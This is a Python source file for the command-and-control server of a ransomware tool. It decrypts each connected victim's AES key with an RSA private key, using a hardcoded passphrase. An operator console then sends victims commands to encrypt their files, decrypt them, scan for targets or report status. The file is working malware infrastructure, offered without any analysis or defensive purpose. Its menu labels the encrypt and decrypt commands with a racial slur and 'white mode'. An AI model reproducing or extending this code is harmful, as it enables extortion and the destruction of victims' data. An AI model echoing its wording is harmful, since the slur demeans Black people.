import socket
import threading
from Cryptodome.PublicKey import RSA
from Cryptodome.Cipher import PKCS1_OAEP
from cryptography.hazmat.primitives.serialization import load_pem_private_key
from cryptography.hazmat.primitives import serialization
import os
import time

def get_local_ip():
    """Returns the local IP address of your machine on the LAN."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
        return local_ip
    except Exception:
        return "127.0.0.1"

def recvf(conn):
    """Receive messages from client"""
    while True:
        try:
            data = conn.recv(2048)
            if not data:
                break
            print(f"[CLIENT] {data.decode('ascii')}")
        except:
            break

def server():
    # Load PRIVATE key (with password)
    if not os.path.exists("private.pem"):
        print("[!] private.pem not found!")
        return
    
    with open("private.pem", "rb") as f:
        private_key_encrypted = f.read()
    
    # Decrypt the private key
    
    
    private_key_crypto = load_pem_private_key(
        private_key_encrypted,
        password=b'my strong passphrase'
    )
    
    # Convert to PyCryptodome format
    private_key_pem = private_key_crypto.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.PKCS8,
        encryption_algorithm=serialization.NoEncryption()
    )
    
    private_key = RSA.import_key(private_key_pem)
    decipher = PKCS1_OAEP.new(private_key)
    
    # Start server
    ip = get_local_ip()
    port = 1234
    print(f"[+] Server running on {ip}:{port}")
    
    # Store victim keys
    victim_keys = {}
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((ip, port))
        s.listen(5)
        print("[+] Waiting for victims...")
        
        c, addr = s.accept()
        victim_id = f"{addr[0]}:{addr[1]}"
        print(f"[+] Victim connected: {victim_id}")
        
        # RECEIVE encrypted AES key from victim
        encrypted_aes_key = c.recv(2048)
        print(f"[+] Received encrypted key ({len(encrypted_aes_key)} bytes)")
        
        # Decrypt victim's AES key
        try:
            victim_aes_key = decipher.decrypt(encrypted_aes_key)
            victim_keys[victim_id] = victim_aes_key
            print(f"[+] Decrypted victim's AES key: {victim_aes_key.hex()}")
            
            # Confirm receipt
            c.send("Key received. System encrypted.".encode('ascii'))
            
        except Exception as e:
            print(f"[!] Failed to decrypt key: {e}")
            c.send("Error receiving key".encode('ascii'))
            return
        
        # Receive messages from victim
        t = threading.Thread(target=recvf, args=(c,))
        t.daemon = True
        t.start()
        
        # Command loop
        # Command loop
        while True:
            print("\n" + "="*50)
            print("AVAILABLE COMMANDS:")
            print("  en / nigga mode    - Encrypt victim files")
            print("  de / white mode    - Decrypt files (send key)")
            print("  scan               - Scan for target files")
            print("  status             - Check victim status")
            print("  exit               - Close connection")
            print("="*50)
            
            command = input(f"\ncommand [{victim_id}] >> ").strip()
            
            if not command:
                continue
            
            if command.lower() == "exit":
                c.send(command.encode('ascii'))
                print("[!] Closing connection...")
                break
            
            elif command.lower() in ["en", "nigga mode"]:
                # Send encryption command
                c.send("en".encode('ascii'))
                print(f"[+] Sent encryption command to {victim_id}")
            
            elif command.lower() in ["de", "white mode"]:
                # Send decryption command
                c.send("de".encode('ascii'))
                time.sleep(0.5)
                
                if victim_id in victim_keys:
                    c.send(victim_keys[victim_id])
                    print(f"[+] Sent decryption key to {victim_id}")
                else:
                    print("[!] No key found for this victim")
            
            elif command.lower() == "scan":
                c.send("scan".encode('ascii'))
                print(f"[+] Sent scan command to {victim_id}")
            
            elif command.lower() == "status":
                c.send("status".encode('ascii'))
                print(f"[+] Sent status command to {victim_id}")
            
            else:
                print("[!] Unknown command")
        
    except Exception as e:
        print(f"[!] Server error: {e}")
    finally:
        s.close()
        print("[!] Server closed.")

if __name__ == "__main__":
    server()